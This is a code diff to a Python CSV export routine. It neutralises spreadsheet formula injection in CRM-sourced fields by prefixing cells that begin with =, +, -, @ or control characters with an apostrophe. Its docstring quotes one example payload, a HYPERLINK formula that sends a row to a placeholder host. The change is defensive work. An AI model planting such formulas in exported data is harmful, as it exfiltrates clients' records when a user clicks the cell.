@@ -204,13 +204,31 @@ def _atomic_write(path: Path, content: str) -> None:
     os.chmod(path, FILE_MODE)
 
 
+# Characters a spreadsheet reads as the start of a formula rather than as text.
+_FORMULA_PREFIXES: Final = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_cell(value: object) -> object:
+    """Neutralise a value a spreadsheet would evaluate instead of showing.
+
+    This file is written for Excel on purpose — the BOM below says so — and its
+    names, phones and service titles come from the CRM, where a client controls
+    their own name. A name beginning `=`, `+`, `-` or `@` is a formula to Excel
+    and LibreOffice, so `=HYPERLINK("http://x/"&A1,"click")` in a name field
+    would exfiltrate the row when the owner clicks it. The leading apostrophe is
+    the standard fix: the cell stays text and displays unchanged.
+    """
+    text = "" if value is None else str(value)
+    return f"'{text}" if text.startswith(_FORMULA_PREFIXES) else value
+
+
 def _csv(rows: Iterable[dict[str, object]]) -> str:
     stream = io.StringIO(newline="")
     # Excel recognises the BOM and opens names in UTF-8 without an import wizard.
     stream.write("\ufeff")
     writer = csv.DictWriter(stream, fieldnames=FIELDNAMES, extrasaction="ignore")
     writer.writeheader()
-    writer.writerows(rows)
+    writer.writerows({field: _csv_cell(row.get(field)) for field in FIELDNAMES} for row in rows)
     return stream.getvalue()
 
 
